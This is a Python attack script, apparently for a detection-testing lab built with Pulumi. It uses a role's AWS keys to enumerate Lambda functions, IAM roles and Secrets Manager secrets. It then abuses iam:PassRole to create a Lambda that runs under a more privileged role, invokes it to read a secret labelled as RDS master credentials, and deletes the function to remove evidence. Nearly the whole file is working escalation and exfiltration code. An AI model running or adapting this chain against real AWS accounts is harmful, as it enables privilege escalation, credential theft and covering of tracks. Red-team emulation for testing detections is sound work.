# FILE: attack.py
"""
ATOMIC-LAMBDA-PASSROLE-INVOKE -- T1648 Serverless Execution (Lambda PassRole)
3-phase attack: credential init -> environment discovery -> PassRole privilege escalation.

Attacker holds iam:PassRole scoped to a single target-role ARN. Creates a Lambda
with that elevated execution role, invokes it to read the canary secret (simulating
RDS credential exfiltration), then deletes the function to erase artifacts.
"""
import sys
import time
import random
import json
import io
import zipfile
import pathlib

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import boto3
from botocore.exceptions import ClientError

# ---------------------------------------------------------------------------
# Resource names -- single source of truth
# ---------------------------------------------------------------------------
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} -- static names fall back to defaults")

_R   = _NAMES.get("resources", {})
_PKS = _NAMES.get("pulumi_export_keys", {})


def _r(key, default=""):
    """Resolve a static resource name from resource_names.json, else use default."""
    return _R.get(key) or default


def _p(outputs, key, default=""):
    """Resolve a dynamic Pulumi output: pulumi_export_keys[key] -> outputs dict -> default."""
    export_key = _PKS.get(key, key)
    return outputs.get(export_key) or default


# Attack-created function name is fixed by the attack plan; never conflicts with lab resources.
ATTACK_FUNCTION_NAME = "atomic-passrole-exfil"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def print_step(msg):
    print(f"\n[*] {msg}")


def print_ok(msg):
    print(f"[+] {msg}")


def print_err(msg):
    print(f"[-] {msg}")


def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))


def phase_delay():
    time.sleep(random.uniform(5, 15))


def make_lambda_zip():
    """Build the exfil Lambda deployment package in memory (no disk I/O)."""
    # Handler: runs under the elevated execution role -> calls GetSecretValue -> returns payload.
    # Self-contained: no external host, no outbound beacon.
    handler_code = (
        "import boto3\n"
        "import json\n"
        "import os\n"
        "\n"
        "def handler(event, context):\n"
        "    secret_arn = os.environ['SECRET_ARN']\n"
        "    sm = boto3.client('secretsmanager')\n"
        "    resp = sm.get_secret_value(SecretId=secret_arn)\n"
        "    secret_string = resp.get('SecretString', '')\n"
        "    return {\n"
        "        'statusCode': 200,\n"
        "        'SecretString': secret_string,\n"
        "    }\n"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, mode='w', compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('index.py', handler_code)
    buf.seek(0)
    return buf.getvalue()


def wait_for_lambda_active(lam, function_name, timeout=90):
    """Poll until Lambda function State == Active (CreateFunction is async)."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            resp = lam.get_function_configuration(FunctionName=function_name)
            state = resp.get('State', '')
            last_update = resp.get('LastUpdateStatus', '')
            if state == 'Active':
                return True
            print_step(f"Lambda state: {state} / LastUpdateStatus: {last_update} -- waiting...")
            time.sleep(3)
        except ClientError as e:
            code = e.response['Error']['Code']
            if code == 'ResourceNotFoundException':
                time.sleep(3)
            else:
                raise
    return False


# ---------------------------------------------------------------------------
# Entry point (backend contract)
# ---------------------------------------------------------------------------

def run(outputs: dict, region: str = 'us-east-1') -> None:
    # -- Static resource names (resolved from resource_names.json, with hardcoded defaults
    #    only as fallbacks for names defined by the attack plan spec) --
    victim_role_name   = _r('victim_role_name',   'atomic-lambda-passrole-invoke-victim-role')
    target_role_name   = _r('target_role_name',   'atomic-lambda-passrole-invoke-target-role')
    decoy_lambda_name  = _r('decoy_lambda_name',  'prod-db-backup-handler')
    canary_secret_name = _r('canary_secret_name', 'prod/rds/master-credentials')

    # -- Dynamic values (resolved from Pulumi stack outputs via pulumi_export_keys map) --
    victim_key_id     = _p(outputs, 'victim_access_key_id')
    victim_key_secret = _p(outputs, 'victim_secret_access_key')
    target_role_arn   = _p(outputs, 'target_role_arn')
    canary_secret_arn = _p(outputs, 'canary_secret_arn')

    if not victim_key_id:
        raise RuntimeError("Missing required output: victim_access_key_id")
    if not victim_key_secret:
        raise RuntimeError("Missing required output: victim_secret_access_key")
    if not target_role_arn:
        raise RuntimeError("Missing required output: target_role_arn")
    if not canary_secret_arn:
        raise RuntimeError("Missing required output: canary_secret_arn")

    # -- Build victim session (static long-lived key -- no STS assume needed) --
    # T1648: victim role holds lambda:Create/Invoke/Delete + iam:PassRole scoped
    # to a single target-role ARN; this is the precondition for the escalation.
    victim_session = boto3.Session(
        aws_access_key_id=victim_key_id,
        aws_secret_access_key=victim_key_secret,
        region_name=region,
    )

    sts = victim_session.client('sts')
    lam = victim_session.client('lambda')
    iam = victim_session.client('iam')
    sm  = victim_session.client('secretsmanager')

    events_generated = []
    attack_lambda_created = False

    try:
        # ==================================================================
        # PHASE 1 -- Credential Initialization
        # ==================================================================
        print_step("=== PHASE 1: Credential Initialization ===")

        # Step 1: Verify session identity -- confirms victim role creds are live
        print_step("Step 1: Verifying victim session identity (GetCallerIdentity)")
        identity = sts.get_caller_identity()
        print_ok(
            f"Session live -- account={identity['Account']}  "
            f"userid={identity['UserId']}  "
            f"arn={identity['Arn']}"
        )
        print_ok(
            f"Victim role '{victim_role_name}' confirmed: "
            "holds lambda:Create/Invoke/Delete + iam:PassRole to target role"
        )
        events_generated.append("GetCallerIdentity (sts.amazonaws.com)")
        op_delay(1, 3)

        phase_delay()

        # ==================================================================
        # PHASE 2 -- Environment Discovery
        # ==================================================================
        print_step("=== PHASE 2: Environment Discovery ===")

        # Step 2: Enumerate Lambda functions -- decoy surfaces as attractive target
        print_step("Step 2: Enumerating Lambda functions (ListFunctions)")
        paginator = lam.get_paginator('list_functions')
        function_names = []
        for page in paginator.paginate():
            for fn in page.get('Functions', []):
                function_names.append(fn['FunctionName'])
        print_ok(f"Found {len(function_names)} Lambda function(s): {function_names}")
        if decoy_lambda_name in function_names:
            print_ok(
                f"Decoy '{decoy_lambda_name}' present -- naming suggests "
                "active DB backup; RDS credentials are likely in Secrets Manager"
            )
        events_generated.append("ListFunctions20150331 (lambda.amazonaws.com)")
        op_delay(2, 5)

        # Step 3: Enumerate IAM roles to locate and confirm the target role ARN
        print_step("Step 3: Enumerating IAM roles to locate target role (ListRoles + GetRole)")
        role_prefix = "atomic-lambda-passrole-invoke"
        paginator = iam.get_paginator('list_roles')
        found_roles = []
        for page in paginator.paginate(PathPrefix='/'):
            for role in page.get('Roles', []):
                if role_prefix in role['RoleName']:
                    found_roles.append(role['RoleName'])
        print_ok(f"Atomic-prefixed roles found: {found_roles}")
        events_generated.append("ListRoles (iam.amazonaws.com)")

        op_delay(1, 2)

        try:
            role_detail = iam.get_role(RoleName=target_role_name)
            confirmed_arn = role_detail['Role']['Arn']
            print_ok(f"Target role GetRole confirmed: {confirmed_arn}")
            # Cross-check: stack output ARN must match what IAM returns
            if confirmed_arn != target_role_arn:
                print_err(
                    f"ARN mismatch: outputs say '{target_role_arn}' "
                    f"but IAM returned '{confirmed_arn}' -- using outputs value"
                )
            events_generated.append("GetRole (iam.amazonaws.com)")
        except ClientError as e:
            code = e.response['Error']['Code']
            if code in ('NoSuchEntity', 'AccessDenied'):
                print_err(f"GetRole {target_role_name}: {code} -- continuing with outputs ARN")
            else:
                raise
        op_delay(2, 5)

        # Step 4: Enumerate Secrets Manager secrets -- canary secret surfaces as RDS creds
        print_step("Step 4: Enumerating Secrets Manager secrets (ListSecrets)")
        paginator = sm.get_paginator('list_secrets')
        secret_names = []
        for page in paginator.paginate():
            for s in page.get('SecretList', []):
                secret_names.append(s.get('Name', s.get('ARN', '')))
        print_ok(f"Found {len(secret_names)} secret(s): {secret_names}")
        if canary_secret_name in secret_names:
            print_ok(
                f"Canary '{canary_secret_name}' found -- "
                "RDS credential path; target for exfiltration after escalation"
            )
        events_generated.append("ListSecrets (secretsmanager.amazonaws.com)")
        op_delay(2, 5)

        phase_delay()

        # ==================================================================
        # PHASE 3 -- PassRole Privilege Escalation via Serverless Execution
        # ==================================================================
        print_step("=== PHASE 3: PassRole Privilege Escalation via Serverless Execution (T1648) ===")

        # Step 5: Create Lambda with privileged target role -- core T1648 vector.
        # iam:PassRole on CreateFunction is the privilege escalation primitive:
        # victim role cannot read the secret directly, but can pass the target role
        # to a Lambda it creates, then invoke that Lambda to do the read.
        print_step(
            f"Step 5: Creating attacker Lambda '{ATTACK_FUNCTION_NAME}' "
            f"with target role ARN via iam:PassRole"
        )
        print_step(f"  Role ARN : {target_role_arn}")
        print_step(f"  Secret   : {canary_secret_arn}")

        zip_bytes = make_lambda_zip()

        try:
            create_resp = lam.create_function(
                FunctionName=ATTACK_FUNCTION_NAME,
                Runtime='python3.12',
                Role=target_role_arn,
                Handler='index.handler',
                Code={'ZipFile': zip_bytes},
                Environment={'Variables': {'SECRET_ARN': canary_secret_arn}},
                Timeout=30,
            )
            attack_lambda_created = True
            print_ok(f"Lambda created: {create_resp['FunctionArn']}")
            events_generated.append(
                "CreateFunction20150331 (lambda.amazonaws.com) -- T1648 iam:PassRole pivot"
            )
        except ClientError as e:
            code = e.response['Error']['Code']
            if code == 'ResourceConflictException':
                # Prior run left the function in place -- reuse it
                print_ok(
                    f"Lambda '{ATTACK_FUNCTION_NAME}' already exists "
                    "(prior run artifact) -- reusing"
                )
                attack_lambda_created = True
            else:
                raise

        # Wait for Active state; CreateFunction is asynchronous for packaged functions
        print_step(f"Waiting for Lambda '{ATTACK_FUNCTION_NAME}' -> Active...")
        active = wait_for_lambda_active(lam, ATTACK_FUNCTION_NAME, timeout=90)
        if not active:
            raise RuntimeError(
                f"Lambda '{ATTACK_FUNCTION_NAME}' did not reach Active state within 90s"
            )
        print_ok("Lambda is Active -- ready to invoke")
        op_delay(5, 10)

        # Step 6: Invoke Lambda -- GetSecretValue runs under target role session,
        # NOT the victim role. CloudTrail will attribute it to the Lambda execution
        # role AssumeRole session -- demonstrating credential pass-through.
        print_step(
            f"Step 6: Invoking Lambda '{ATTACK_FUNCTION_NAME}' "
            "to exfiltrate canary secret via escalated execution role"
        )
        print_step(
            "  GetSecretValue will be attributed to Lambda execution role session "
            "in CloudTrail -- not to victim role"
        )

        try:
            invoke_resp = lam.invoke(
                FunctionName=ATTACK_FUNCTION_NAME,
                InvocationType='RequestResponse',
                LogType='Tail',
            )

            function_error = invoke_resp.get('FunctionError')
            payload_bytes = invoke_resp['Payload'].read()
            try:
                payload_json = json.loads(payload_bytes.decode('utf-8'))
            except (ValueError, UnicodeDecodeError):
                payload_json = {}

            if function_error:
                print_err(f"Lambda FunctionError: {function_error}")
                print_err(f"Payload: {payload_json}")
                raise RuntimeError(
                    f"Lambda returned FunctionError '{function_error}' -- "
                    "check that target role policy grants secretsmanager:GetSecretValue "
                    "on the canary secret ARN"
                )

            secret_string = payload_json.get('SecretString', '')
            status_code   = payload_json.get('statusCode', '')
            print_ok(f"Invocation HTTP status in payload: {status_code}")
            print_ok("Exfiltration SUCCESS -- canary secret retrieved via escalated Lambda session")
            # Truncate for log safety; real red-team tools would exfil in full
            print_ok(f"SecretString preview (first 80 chars): {str(secret_string)[:80]}")
            events_generated.append(
                "InvokeFunction (lambda.amazonaws.com) -- secret read via escalated role"
            )

        except ClientError as e:
            code = e.response['Error']['Code']
            if code == 'AccessDenied':
                print_err(
                    f"Lambda:InvokeFunction AccessDenied -- "
                    f"victim policy may be missing lambda:InvokeFunction: {e}"
                )
            else:
                raise
        op_delay(3, 8)

    finally:
        # ==================================================================
        # STEP 7 (in finally block): Delete attack Lambda -- T1070 Defense Evasion.
        # Short create->invoke->delete lifecycle (<60 s) is itself a detection
        # signal but removes the persistent function configuration as evidence.
        # ==================================================================
        if attack_lambda_created:
            print_step(
                f"Step 7 (cleanup): Deleting Lambda '{ATTACK_FUNCTION_NAME}' "
                "(T1070 -- artifact removal; short lifecycle is a detection IOC)"
            )
            try:
                lam.delete_function(FunctionName=ATTACK_FUNCTION_NAME)
                print_ok(f"Lambda '{ATTACK_FUNCTION_NAME}' deleted")
                events_generated.append("DeleteFunction20150331 (lambda.amazonaws.com) -- T1070 cleanup")
            except ClientError as e:
                code = e.response['Error']['Code']
                if code == 'ResourceNotFoundException':
                    print_ok(f"Lambda '{ATTACK_FUNCTION_NAME}' already gone")
                elif code == 'AccessDenied':
                    print_err(
                        f"DeleteFunction AccessDenied -- "
                        f"manual cleanup required for '{ATTACK_FUNCTION_NAME}'"
                    )
                else:
                    print_err(f"DeleteFunction unexpected error: {e}")

    # Summary
    print_step("Attack chain complete.")
    print_step("CloudTrail / audit events generated:")
    for evt in events_generated:
        print(f"  - {evt}")
    print_step(
        "Reminder: pulumi destroy removes victim-role, target-role, "
        "canary-secret, and decoy-lambda."
    )
